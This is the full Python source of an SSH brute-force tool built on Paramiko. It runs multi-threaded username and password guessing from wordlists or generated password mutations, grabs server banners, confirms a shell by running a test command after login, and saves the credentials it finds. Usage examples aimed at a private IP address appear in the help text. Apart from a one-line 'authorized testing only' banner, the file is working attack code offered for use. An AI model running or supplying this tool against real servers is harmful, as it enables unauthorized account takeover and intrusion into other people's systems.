#!/usr/bin/env python3
"""
SSH Brute Force Tool
A comprehensive utility for testing SSH server security through controlled
brute force attacks using the Paramiko library. Supports multi-threading,
custom ports, various authentication methods, and intelligent attack patterns.
"""

import argparse
import sys
import os
import threading
import queue
import time
import logging
import socket
from datetime import datetime
from typing import List, Tuple, Optional, Dict
from concurrent.futures import ThreadPoolExecutor, as_completed
import itertools

# Try importing paramiko with fallback message
try:
    import paramiko
    from paramiko import AutoAddPolicy, AuthenticationException, SSHException
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False

# Optional imports for enhanced functionality
try:
    from colorama import init, Fore, Style
    COLORAMA_AVAILABLE = True
    init()  # Initialize colorama for Windows support
except ImportError:
    COLORAMA_AVAILABLE = False

class SSHBruteForcer:
    """
    Main class for SSH brute force operations
    Handles connection testing, credential validation, and multi-threaded attacks
    """
    
    # Common SSH ports
    DEFAULT_PORTS = [22, 2222, 22222, 8022, 2200]
    
    # SSH authentication timeouts
    CONNECTION_TIMEOUT = 5
    AUTH_TIMEOUT = 3
    
    def __init__(self, target: str, port: int = 22, username: Optional[str] = None,
                 timeout: int = 5, verbose: bool = False, use_keys: bool = False):
        """
        Initialize SSH brute forcer
        
        Args:
            target: Target IP or hostname
            port: SSH port (default: 22)
            username: Single username to test (optional)
            timeout: Connection timeout in seconds
            verbose: Enable verbose output
            use_keys: Attempt key-based authentication
        """
        if not PARAMIKO_AVAILABLE:
            raise ImportError(
                "paramiko module is required. Install with: pip install paramiko"
            )
        
        self.target = target
        self.port = port
        self.single_username = username
        self.timeout = timeout
        self.verbose = verbose
        self.use_keys = use_keys
        
        # Statistics and state
        self.found_credentials = []
        self.lock = threading.Lock()
        self.stop_event = threading.Event()
        self.stats = {
            'attempts': 0,
            'successes': 0,
            'failures': 0,
            'connection_errors': 0,
            'start_time': None
        }
        
        # Setup logging
        self.setup_logging()
        
        # Validate target
        self.validate_target()
    
    def setup_logging(self):
        """Configure logging with optional colors"""
        self.logger = logging.getLogger('SSHBruteForcer')
        
        # Remove existing handlers
        self.logger.handlers.clear()
        
        # Create console handler
        handler = logging.StreamHandler()
        
        # Set format based on colorama availability
        if COLORAMA_AVAILABLE:
            formatter = logging.Formatter(
                f'{Fore.CYAN}%(asctime)s{Style.RESET_ALL} - '
                f'{Fore.YELLOW}%(levelname)s{Style.RESET_ALL} - %(message)s',
                datefmt='%H:%M:%S'
            )
        else:
            formatter = logging.Formatter(
                '%(asctime)s - %(levelname)s - %(message)s',
                datefmt='%H:%M:%S'
            )
        
        handler.setFormatter(formatter)
        self.logger.addHandler(handler)
        
        # Set log level
        self.logger.setLevel(logging.DEBUG if self.verbose else logging.INFO)
    
    def validate_target(self):
        """Validate target is reachable and SSH port is open"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            result = sock.connect_ex((self.target, self.port))
            sock.close()
            
            if result != 0:
                self.logger.warning(
                    f"Target {self.target}:{self.port} appears unreachable. "
                    "Connection may fail."
                )
            else:
                self.logger.info(f"Target {self.target}:{self.port} is reachable")
                
        except Exception as e:
            self.logger.error(f"Target validation failed: {e}")
    
    def test_connection(self, username: str, password: str, 
                        key_file: Optional[str] = None) -> Tuple[bool, Optional[str]]:
        """
        Test SSH connection with given credentials
        
        Args:
            username: Username to test
            password: Password to test
            key_file: Path to private key file (optional)
        
        Returns:
            Tuple of (success, error_message)
        """
        client = None
        try:
            # Create SSH client
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(AutoAddPolicy())
            
            # Set timeout
            client.connect(
                hostname=self.target,
                port=self.port,
                username=username,
                password=password if not key_file else None,
                key_filename=key_file if key_file else None,
                timeout=self.timeout,
                auth_timeout=self.AUTH_TIMEOUT,
                allow_agent=False,
                look_for_keys=False
            )
            
            # Test if connection is functional
            transport = client.get_transport()
            if transport and transport.is_active():
                # Try to execute a simple command to verify full access
                try:
                    stdin, stdout, stderr = client.exec_command('echo "test"', timeout=5)
                    output = stdout.read().decode().strip()
                    if output == "test":
                        return True, None
                except:
                    # Even if command fails, authentication succeeded
                    return True, "Authentication successful but command execution failed"
                
                return True, None
            
            return False, "Connection inactive after authentication"
            
        except AuthenticationException:
            return False, "Authentication failed"
        except SSHException as e:
            return False, f"SSH protocol error: {str(e)}"
        except socket.timeout:
            return False, "Connection timeout"
        except socket.error as e:
            return False, f"Network error: {str(e)}"
        except Exception as e:
            return False, f"Unexpected error: {str(e)}"
        finally:
            if client:
                try:
                    client.close()
                except:
                    pass
    
    def get_banner(self) -> Optional[str]:
        """
        Retrieve SSH banner from target
        
        Returns:
            Banner string or None
        """
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.target, self.port))
            banner = sock.recv(1024).decode().strip()
            sock.close()
            return banner
        except:
            return None
    
    def worker(self, task_queue: queue.Queue, results_queue: queue.Queue):
        """
        Worker thread for processing credential attempts
        
        Args:
            task_queue: Queue with (username, password) tuples
            results_queue: Queue for successful results
        """
        while not self.stop_event.is_set():
            try:
                username, password = task_queue.get(timeout=1)
            except queue.Empty:
                break
            
            # Test credentials
            success, error = self.test_connection(username, password)
            
            # Update statistics
            with self.lock:
                self.stats['attempts'] += 1
                if success:
                    self.stats['successes'] += 1
                    result = {
                        'username': username,
                        'password': password,
                        'timestamp': datetime.now().isoformat(),
                        'target': f"{self.target}:{self.port}"
                    }
                    self.found_credentials.append(result)
                    results_queue.put(result)
                    
                    # Log success with colors
                    if COLORAMA_AVAILABLE:
                        self.logger.info(
                            f"{Fore.GREEN}[+] SUCCESS: {username}:{password}{Style.RESET_ALL}"
                        )
                    else:
                        self.logger.info(f"[+] SUCCESS: {username}:{password}")
                else:
                    self.stats['failures'] += 1
                    
                    # Log failures in verbose mode
                    if self.verbose and error:
                        if COLORAMA_AVAILABLE:
                            self.logger.debug(
                                f"{Fore.RED}[-] Failed: {username}:{password} - {error}{Style.RESET_ALL}"
                            )
                        else:
                            self.logger.debug(f"[-] Failed: {username}:{password} - {error}")
            
            task_queue.task_done()
            
            # Small delay to prevent overwhelming the server
            time.sleep(0.1)
    
    def brute_force(self, usernames: List[str], passwords: List[str],
                   threads: int = 5, max_attempts: Optional[int] = None,
                   stop_on_success: bool = True) -> List[Dict]:
        """
        Perform brute force attack
        
        Args:
            usernames: List of usernames to test
            passwords: List of passwords to test
            threads: Number of concurrent threads
            max_attempts: Maximum number of attempts
            stop_on_success: Stop when first credential is found
        
        Returns:
            List of found credentials
        """
        self.logger.info(f"[*] Starting SSH brute force attack")
        self.logger.info(f"[*] Target: {self.target}:{self.port}")
        self.logger.info(f"[*] Usernames: {len(usernames)}")
        self.logger.info(f"[*] Passwords: {len(passwords)}")
        self.logger.info(f"[*] Total combinations: {len(usernames) * len(passwords):,}")
        self.logger.info(f"[*] Threads: {threads}")
        
        # Get banner if available
        banner = self.get_banner()
        if banner:
            self.logger.info(f"[*] Server banner: {banner}")
        
        # Create task queue
        task_queue = queue.Queue()
        results_queue = queue.Queue()
        
        # Populate task queue
        attempt_count = 0
        for username in usernames:
            for password in passwords:
                task_queue.put((username, password))
                attempt_count += 1
                if max_attempts and attempt_count >= max_attempts:
                    break
            if max_attempts and attempt_count >= max_attempts:
                break
        
        total_attempts = attempt_count
        self.stats['start_time'] = time.time()
        
        # Start worker threads
        thread_list = []
        for _ in range(min(threads, total_attempts)):
            t = threading.Thread(
                target=self.worker,
                args=(task_queue, results_queue),
                daemon=True
            )
            t.start()
            thread_list.append(t)
        
        # Monitor progress
        last_attempts = 0
        try:
            while any(t.is_alive() for t in thread_list) and not self.stop_event.is_set():
                time.sleep(2)
                
                # Check for results
                while not results_queue.empty():
                    result = results_queue.get()
                    if stop_on_success:
                        self.logger.info("[*] Stopping attack - credentials found")
                        self.stop_event.set()
                        return self.found_credentials
                
                # Update progress
                current_attempts = self.stats['attempts']
                if current_attempts > last_attempts:
                    elapsed = time.time() - self.stats['start_time']
                    rate = current_attempts / elapsed if elapsed > 0 else 0
                    percent = (current_attempts / total_attempts) * 100
                    
                    if COLORAMA_AVAILABLE:
                        self.logger.info(
                            f"{Fore.CYAN}[*] Progress: {current_attempts:,}/{total_attempts:,} "
                            f"({percent:.1f}%) | Rate: {rate:.1f}/s | "
                            f"Found: {len(self.found_credentials)}{Style.RESET_ALL}"
                        )
                    else:
                        self.logger.info(
                            f"[*] Progress: {current_attempts:,}/{total_attempts:,} "
                            f"({percent:.1f}%) | Rate: {rate:.1f}/s | "
                            f"Found: {len(self.found_credentials)}"
                        )
                    
                    last_attempts = current_attempts
                
        except KeyboardInterrupt:
            self.logger.info("[!] Interrupted by user")
            self.stop_event.set()
        
        # Wait for threads to finish
        for t in thread_list:
            t.join(timeout=2)
        
        # Final statistics
        elapsed = time.time() - self.stats['start_time']
        self.logger.info(f"[*] Attack completed in {elapsed:.2f} seconds")
        self.logger.info(f"[*] Total attempts: {self.stats['attempts']:,}")
        self.logger.info(f"[*] Successful: {len(self.found_credentials)}")
        
        return self.found_credentials
    
    def dictionary_attack(self, username: str, password_file: str,
                          threads: int = 5) -> List[Dict]:
        """
        Perform dictionary attack with single username
        
        Args:
            username: Username to test
            password_file: File containing passwords
            threads: Number of threads
        
        Returns:
            List of found credentials
        """
        # Load passwords
        passwords = self.load_wordlist(password_file)
        if not passwords:
            self.logger.error("[-] No passwords loaded")
            return []
        
        return self.brute_force([username], passwords, threads)
    
    def username_brute(self, password: str, username_file: str,
                       threads: int = 5) -> List[Dict]:
        """
        Brute force usernames with single password
        
        Args:
            password: Password to test
            username_file: File containing usernames
            threads: Number of threads
        
        Returns:
            List of found credentials
        """
        # Load usernames
        usernames = self.load_wordlist(username_file)
        if not usernames:
            self.logger.error("[-] No usernames loaded")
            return []
        
        return self.brute_force(usernames, [password], threads)
    
    def load_wordlist(self, wordlist_file: str) -> List[str]:
        """
        Load words from a file
        
        Args:
            wordlist_file: Path to wordlist file
        
        Returns:
            List of words
        """
        words = []
        try:
            with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as f:
                words = [line.strip() for line in f if line.strip()]
            self.logger.info(f"[+] Loaded {len(words)} entries from {wordlist_file}")
        except FileNotFoundError:
            self.logger.error(f"[-] File not found: {wordlist_file}")
        except Exception as e:
            self.logger.error(f"[-] Error loading wordlist: {e}")
        
        return words
    
    def generate_common_passwords(self, base_words: List[str] = None) -> List[str]:
        """
        Generate common password variations
        
        Args:
            base_words: List of base words to mutate
        
        Returns:
            List of generated passwords
        """
        if not base_words:
            base_words = ['password', 'admin', 'root', 'user', 'test', '123456']
        
        passwords = set()
        
        # Common mutations
        mutations = [
            lambda x: x,  # Original
            lambda x: x.capitalize(),
            lambda x: x.upper(),
            lambda x: x + '123',
            lambda x: x + '!',
            lambda x: x + '@',
            lambda x: x + '2023',
            lambda x: x + '2024',
            lambda x: x + '2025',
            lambda x: x[::-1],  # Reverse
        ]
        
        for word in base_words:
            for mutation in mutations:
                try:
                    passwords.add(mutation(word))
                except:
                    pass
        
        return list(passwords)
    
    def save_results(self, output_file: str):
        """
        Save found credentials to file
        
        Args:
            output_file: Output file path
        """
        if not self.found_credentials:
            self.logger.info("[-] No credentials to save")
            return
        
        try:
            with open(output_file, 'w') as f:
                f.write("SSH Brute Force Results\n")
                f.write("=" * 50 + "\n")
                f.write(f"Target: {self.target}:{self.port}\n")
                f.write(f"Date: {datetime.now().isoformat()}\n")
                f.write(f"Total attempts: {self.stats['attempts']:,}\n")
                f.write("=" * 50 + "\n\n")
                
                for cred in self.found_credentials:
                    f.write(f"Username: {cred['username']}\n")
                    f.write(f"Password: {cred['password']}\n")
                    f.write(f"Timestamp: {cred['timestamp']}\n")
                    f.write("-" * 30 + "\n")
            
            self.logger.info(f"[+] Results saved to: {output_file}")
            
        except Exception as e:
            self.logger.error(f"[-] Failed to save results: {e}")

def parse_list_input(input_str: str) -> List[str]:
    """
    Parse input string that could be a file or comma-separated list
    
    Args:
        input_str: File path or comma-separated list
    
    Returns:
        List of items
    """
    items = []
    
    # Check if input is a file
    if os.path.isfile(input_str):
        with open(input_str, 'r', encoding='utf-8', errors='ignore') as f:
            items = [line.strip() for line in f if line.strip()]
    else:
        # Comma-separated list
        items = [item.strip() for item in input_str.split(',') if item.strip()]
    
    return items

def banner():
    """Display tool banner"""
    banner_text = f"""
{'='*60}
    SSH Brute Force Tool with Paramiko
    For authorized security testing only
{'='*60}
    """
    if COLORAMA_AVAILABLE:
        print(f"{Fore.CYAN}{banner_text}{Style.RESET_ALL}")
    else:
        print(banner_text)

def main():
    """Main function for command-line interface"""
    parser = argparse.ArgumentParser(
        description='SSH Brute Force Tool - Test SSH authentication security',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Dictionary attack with single username
  python ssh_bruteforce.py 192.168.1.100 -u root -P passwords.txt
  
  # Multi-user, multi-password attack
  python ssh_bruteforce.py 192.168.1.100 -U users.txt -P passwords.txt -t 10
  
  # Username brute force with single password
  python ssh_bruteforce.py 192.168.1.100 --brute-users passwords.txt -p "Password123"
  
  # Custom port and verbose output
  python ssh_bruteforce.py 192.168.1.100 --port 2222 -U users.txt -P passwords.txt -v
  
  # Generate common password variations
  python ssh_bruteforce.py 192.168.1.100 -u admin --generate -o results.txt
        """
    )
    
    # Target arguments
    parser.add_argument('target', help='Target IP address or hostname')
    parser.add_argument('--port', '-p', type=int, default=22,
                       help='SSH port (default: 22)')
    parser.add_argument('--timeout', type=int, default=5,
                       help='Connection timeout in seconds (default: 5)')
    
    # Credential arguments
    user_group = parser.add_mutually_exclusive_group(required=True)
    user_group.add_argument('-u', '--username', help='Single username')
    user_group.add_argument('-U', '--usernames', help='Usernames file or comma-separated list')
    
    pass_group = parser.add_mutually_exclusive_group(required=True)
    pass_group.add_argument('-P', '--passwords', help='Passwords file or comma-separated list')
    pass_group.add_argument('--brute-users', action='store_true',
                           help='Brute force usernames with single password')
    
    # Attack options
    parser.add_argument('-t', '--threads', type=int, default=5,
                       help='Number of threads (default: 5)')
    parser.add_argument('--generate', action='store_true',
                       help='Generate common password variations from base list')
    parser.add_argument('--max-attempts', type=int,
                       help='Maximum number of attempts')
    parser.add_argument('--no-stop', action='store_true',
                       help='Continue after finding credentials')
    
    # Output options
    parser.add_argument('-o', '--output', help='Output file for results')
    parser.add_argument('-v', '--verbose', action='store_true',
                       help='Verbose output')
    parser.add_argument('--banner', action='store_true',
                       help='Display SSH banner')
    
    args = parser.parse_args()
    
    # Display banner
    banner()
    
    # Check if paramiko is available
    if not PARAMIKO_AVAILABLE:
        print("[!] paramiko module is required. Install with: pip install paramiko")
        sys.exit(1)
    
    try:
        # Initialize brute forcer
        forcer = SSHBruteForcer(
            target=args.target,
            port=args.port,
            username=args.username,
            timeout=args.timeout,
            verbose=args.verbose
        )
        
        # Display banner if requested
        if args.banner:
            banner = forcer.get_banner()
            if banner:
                print(f"\n[*] SSH Banner: {banner}\n")
        
        # Load usernames
        usernames = []
        if args.username:
            usernames = [args.username]
        elif args.usernames:
            usernames = parse_list_input(args.usernames)
        
        if not usernames:
            print("[-] No valid usernames provided")
            sys.exit(1)
        
        # Handle different attack modes
        if args.brute_users:
            # Username brute force mode
            if not args.passwords:
                print("[-] Password required for username brute force")
                sys.exit(1)
            
            print(f"\n[*] Username brute force mode")
            print(f"[*] Testing password: {args.passwords}")
            print(f"[*] Username list: {len(usernames)} entries\n")
            
            found = forcer.username_brute(
                password=args.passwords,
                username_file=args.usernames if args.usernames else None,
                threads=args.threads
            )
            
        else:
            # Standard brute force mode
            # Load or generate passwords
            passwords = []
            if args.generate:
                # Generate passwords from common variations
                base_words = usernames + ['password', 'admin', 'root', '123456']
                passwords = forcer.generate_common_passwords(base_words)
                print(f"[*] Generated {len(passwords)} password variations")
            else:
                passwords = parse_list_input(args.passwords)
            
            if not passwords:
                print("[-] No valid passwords provided")
                sys.exit(1)
            
            print(f"\n[*] Standard brute force mode")
            print(f"[*] Usernames: {len(usernames)}")
            print(f"[*] Passwords: {len(passwords)}")
            print(f"[*] Total combinations: {len(usernames) * len(passwords):,}\n")
            
            found = forcer.brute_force(
                usernames=usernames,
                passwords=passwords,
                threads=args.threads,
                max_attempts=args.max_attempts,
                stop_on_success=not args.no_stop
            )
        
        # Save results if requested
        if args.output and found:
            forcer.save_results(args.output)
        
        # Display summary
        if found:
            print(f"\n{'='*60}")
            print(f"[+] SUCCESS! Found {len(found)} credential(s):")
            for cred in found:
                print(f"    {cred['username']}:{cred['password']}")
            print(f"{'='*60}\n")
        else:
            print(f"\n[-] No valid credentials found\n")
        
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Error: {e}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()
